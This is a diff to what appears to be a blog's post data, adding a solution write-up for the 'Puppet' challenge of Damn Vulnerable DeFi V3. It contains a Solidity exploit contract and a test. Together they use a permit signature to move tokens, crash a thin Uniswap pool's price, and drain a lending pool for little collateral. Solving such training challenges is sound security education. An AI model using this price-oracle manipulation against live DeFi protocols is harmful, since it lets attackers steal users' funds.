@@ -294,7 +294,6 @@ contract Exploit_Selfie is IERC3156FlashBorrower {
 });`,
             ],
         },
-        ,
         {
             id: "damn-vulnerable-defi-solutions-7-compromised",
             title: `Damn Vulnerable DeFi V3 Solutions: Compromised`,
@@ -329,6 +328,81 @@ contract Exploit_Selfie is IERC3156FlashBorrower {
 
     await nftToken.connect(player).approve(exchange.address, 0);
     await exchange.connect(player).sellOne(0);
+});`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-8-puppet",
+            title: `Damn Vulnerable DeFi V3 Solutions: Puppet`,
+            description: `My solution to 8th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 8, 2023",
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./RequiredInterfaces.sol";
+
+contract Exploit_Puppet {
+    constructor(
+        IERC20Permit token,
+        IUniswapExchange exchange,
+        ILendingPool lendingPool,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) payable {
+        uint256 DVTAmount = token.balanceOf(msg.sender);
+        // Use the signature to approve on behalf of attackerEOA
+        token.permit(
+            msg.sender,
+            address(this),
+            type(uint256).max,
+            type(uint256).max,
+            v,
+            r,
+            s
+        );
+        // now we can transfer the tokens from attackerEOA to this contract
+        token.transferFrom(msg.sender, address(this), DVTAmount);
+        // Swap the entire token balance for ETH.
+        // Since the pool has little liquidity there will be a massive inbalance in price after this swap
+        token.approve(address(exchange), DVTAmount);
+        exchange.tokenToEthSwapInput(DVTAmount, 1, block.timestamp + 1000);
+        // Required collateral is now very low (19,67 ETH) compared to needed amount before the swap.
+        lendingPool.borrow{value: address(this).balance}(
+            token.balanceOf(address(lendingPool)),
+            msg.sender //attackerEOA
+        );
+    }
+}
+`,
+                `it("Exploit", async function () {
+    // Compute the address that we want to permit (attacker contract)
+    const attackerAddress = ethers.utils.getContractAddress({
+        from: player.address,
+        nonce: 0,
+    });
+    // Sign the permit and return v, r, s value. Whe will pass these value to attacker contract contructor
+    // and the attacker contract will use them to approve on behalf of attackerEOA
+    const { r, s, v } = await signERC2612Permit(
+        player,
+        token.address,
+        player.address,
+        attackerAddress,
+        ethers.constants.MaxUint256
+    );
+    // Deploy the attack contract with the given parameters and initilize it wiht 20 ETH
+    attacker = await (
+        await ethers.getContractFactory("Exploit_Puppet", player)
+    ).deploy(
+        token.address,
+        uniswapExchange.address,
+        lendingPool.address,
+        v,
+        r,
+        s,
+        { value: ethers.utils.parseEther("20") }
+    );
 });`,
             ],
         },
